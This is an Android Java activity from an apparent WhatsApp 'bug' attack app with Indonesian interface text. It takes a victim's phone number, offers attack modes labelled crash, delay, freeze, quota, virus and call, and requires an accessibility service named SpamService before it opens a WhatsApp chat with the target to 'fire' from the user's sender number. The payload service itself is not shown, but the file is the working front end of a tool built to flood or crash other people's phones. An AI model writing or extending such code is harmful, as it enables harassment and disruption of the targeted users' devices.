package com.kaze.bugwa;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;

public class MainActivity extends Activity {
    public static boolean isRunning = false;
    public static String targetNum = "";
    public static String senderNum = "";
    public static String bugType = "crash";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Load Banner Image Secara Paksa
        ImageView banner = findViewById(R.id.bannerImage);
        int bannerResId = getResources().getIdentifier("bannerbug", "drawable", getPackageName());
        if (bannerResId != 0) {
            banner.setImageResource(bannerResId);
        } else {
            banner.setBackgroundColor(0xFF333333); // Fallback abu-abu jika gambar gagal
        }

        final EditText etTarget = findViewById(R.id.targetNum);
        Button btnStart = findViewById(R.id.btnStart);
        
        LinearLayout bugCrash = findViewById(R.id.bugCrash);
        LinearLayout bugDelay = findViewById(R.id.bugDelay);
        LinearLayout bugFreeze = findViewById(R.id.bugFreeze);
        LinearLayout bugQuota = findViewById(R.id.bugQuota);
        LinearLayout bugVirus = findViewById(R.id.bugVirus);
        LinearLayout bugCall = findViewById(R.id.bugCall);

        bugCrash.setOnClickListener(v -> bugType = "crash");
        bugDelay.setOnClickListener(v -> bugType = "delay");
        bugFreeze.setOnClickListener(v -> bugType = "freeze");
        bugQuota.setOnClickListener(v -> bugType = "quota");
        bugVirus.setOnClickListener(v -> bugType = "virus");
        bugCall.setOnClickListener(v -> bugType = "call");

        findViewById(R.id.btnManageSender).setOnClickListener(v -> showAddSenderDialog());

        btnStart.setOnClickListener(v -> {
            targetNum = etTarget.getText().toString().trim();
            if(targetNum.startsWith("0")) targetNum = "62" + targetNum.substring(1);
            if(targetNum.isEmpty()) { 
                Toast.makeText(this, "Isi nomor target!", Toast.LENGTH_SHORT).show(); 
                return; 
            }
            
            if(!isAccessibilityEnabled()) {
                Toast.makeText(this, "Aktifkan Aksesibilitas dulu di Pengaturan HP!", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } else {
                SharedPreferences prefs = getSharedPreferences("kaze", MODE_PRIVATE);
                senderNum = prefs.getString("sender", "");
                if (senderNum.isEmpty()) {
                    showAddSenderDialog();
                } else {
                    launchWA();
                }
            }
        });
    }

    private void showAddSenderDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("MANAGE SENDER");
        builder.setMessage("Masukkan nomor WhatsApp Anda (Tanpa 0/+):");
        final EditText input = new EditText(this);
        input.setHint("Contoh: 628987654321");
        input.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
        builder.setView(input);
        builder.setPositiveButton("SIMPAN", (dialog, which) -> {
            String num = input.getText().toString().trim();
            if(num.startsWith("0")) num = "62" + num.substring(1);
            if(!num.isEmpty()) {
                senderNum = num;
                getSharedPreferences("kaze", MODE_PRIVATE).edit().putString("sender", num).apply();
                Toast.makeText(this, "Sender tersimpan: " + num, Toast.LENGTH_SHORT).show();
            }
        });
        builder.setNegativeButton("BATAL", (dialog, which) -> dialog.cancel());
        builder.show();
    }

    private void launchWA() {
        isRunning = true;
        Toast.makeText(this, "Menembak dari " + senderNum, Toast.LENGTH_SHORT).show();
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/" + targetNum));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    private boolean isAccessibilityEnabled() {
        String service = getPackageName() + "/" + SpamService.class.getCanonicalName();
        try {
            String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) { return false; }
    }
}
